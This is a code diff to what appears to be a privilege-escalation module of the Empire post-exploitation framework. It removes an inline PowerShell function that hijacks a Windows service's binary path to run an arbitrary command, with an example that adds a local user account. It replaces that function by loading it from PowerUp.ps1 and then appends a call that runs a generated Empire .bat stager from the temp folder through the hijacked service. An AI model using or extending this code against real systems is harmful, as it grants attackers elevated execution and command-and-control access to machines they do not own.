@@ -5,11 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-ServiceStager',
+            'Name': 'Invoke-ServiceCMD',
 
             'Author': ['@harmj0y'],
 
-            'Description': ("Modifies a target service execute an Empire stager."),
+            'Description': ("Modifies a target service to execute an Empire stager."),
 
             'Background' : True,
 
@@ -75,126 +75,31 @@ class Module:
 
     def generate(self):
 
-        script = """
-function Invoke-ServiceCMD {
-    <#
-    .SYNOPSIS
-    Modifies a target service to execute a specified command.
-    
-    .DESCRIPTION
-    This function stops a service, modifies it to execute a given command, starts
-    the service, stops it, and then restores the original EXE path.
-    
-    .PARAMETER ServiceName
-    The service name to manipulate. Required.
+        moduleName = self.info["Name"]
+        
+        # read in the common powerup.ps1 module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
 
-    .PARAMETER CMD
-    The command to execute. Required.
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
 
-    .EXAMPLE
-    > Invoke-ServiceUserAdd -ServiceName VulnSVC -Command "net user john Password123! /add"
-    Abuses service 'VulnSVC' to add a localuser "john" with password 
-    "Password123! to the machine.
-    #>
+        moduleCode = f.read()
+        f.close()
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Mandatory = $True)]
-        [string]
-        $ServiceName,
-
-        [Parameter(Mandatory = $True)]
-        [string]
-        $CMD
-    )
-
-    # query WMI for the service
-    $TargetService = gwmi win32_service -Filter "Name='$ServiceName'" | ?{$_}
-
-    # make sure we got a result back
-    if ($TargetService){
-        try{
-
-            # try to enable the service it was it was disabled
-            $RestoreDisabled = $false
-            if ($TargetService.StartMode -eq "Disabled"){
-                Write-Verbose "Service '$ServiceName' disabled, enabling..."
-
-                $result = sc.exe config $($TargetService.Name) start= demand
-                if ($result -contains "Access is denied."){
-                    Write-Warning "[!] Access to service $($TargetService.Name) denied"
-                    return $false
-                }
-                $RestoreDisabled = $true
-            }
-
-            # extract the original path and state so we can restore it later
-            $OriginalPath = $TargetService.PathName
-            $OriginalState = $TargetService.State
-            Write-Verbose "Service '$ServiceName' original path: '$OriginalPath'"
-            Write-Verbose "Service '$ServiceName' original state: '$OriginalState'"
-
-            Write-Verbose "Setting service to execute command '$CMD'"
-            # stop the service
-            $result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-
-            # change the path name to the specified command
-            $result = sc.exe config $($TargetService.Name) binPath= $CMD
-
-            # start the service and breath
-            $result = sc.exe start $($TargetService.Name)
-            Start-Sleep -s 1
-
-            Write-Verbose "Restoring original path to service '$ServiceName'"
-            # stop the service
-            $result = sc.exe stop $($TargetService.Name)
-            Start-Sleep -s 1
-
-            # restore the original binary path
-            $result = sc.exe config $($TargetService.Name) binPath= $OriginalPath
-
-            # try to restore the service to whatever state it was
-            if ($RestoreDisabled){
-                Write-Verbose "Re-disabling service '$ServiceName'"
-                $result = sc.exe config $($TargetService.Name) start= disbaled
-            }
-            elseif ($OriginalState -eq "Paused"){
-                Write-Verbose "Starting and then pausing service '$ServiceName'"
-                $result = sc.exe start $($TargetService.Name)
-                Start-Sleep -s .5
-                $result = sc.exe pause $($TargetService.Name)
-            }
-            elseif ($OriginalState -eq "Stopped"){
-                Write-Verbose "Leaving service '$ServiceName' in stopped state"
-            }
-            else{
-                Write-Verbose "Starting service '$ServiceName'"
-                $result = sc.exe start $($TargetService.Name)
-            }
-
-            "Command '$CMD' executed."
-        }
-        catch{
-            Write-Warning "Error while modifying service '$ServiceName': $_"
-            $false
-        }
-    }
-
-    else{
-        Write-Warning "Target service '$ServiceName' not found on the machine"
-        $false
-    }
-}
-"""
+        # get just the code needed for the specified function
+        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
 
         # extract all of our options
         serviceName = self.options['ServiceName']['Value']
         listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
 
+        if not self.mainMenu.listeners.is_listener_empire(listenerName):
+            print helpers.color("[!] Empire listener required!")
+            return ""
+        
         # generate the .bat launcher code to write out to the specified location
         l = self.mainMenu.stagers.stagers['launcher_bat']
         l.options['Listener']['Value'] = self.options['Listener']['Value']
@@ -213,6 +118,7 @@ function Invoke-ServiceCMD {
         if launcherCode == "":
             print helpers.color("[!] Error in launcher .bat generation.")
             return ""
-        else:
-            script += "Invoke-ServiceCMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C `\"$env:Temp\debug.bat`\"\""
-            return script
+
+        script += "Invoke-ServiceCMD -ServiceName \""+serviceName+"\" -CMD \"C:\Windows\System32\cmd.exe /C `\"$env:Temp\debug.bat`\"\""
+            
+        return script
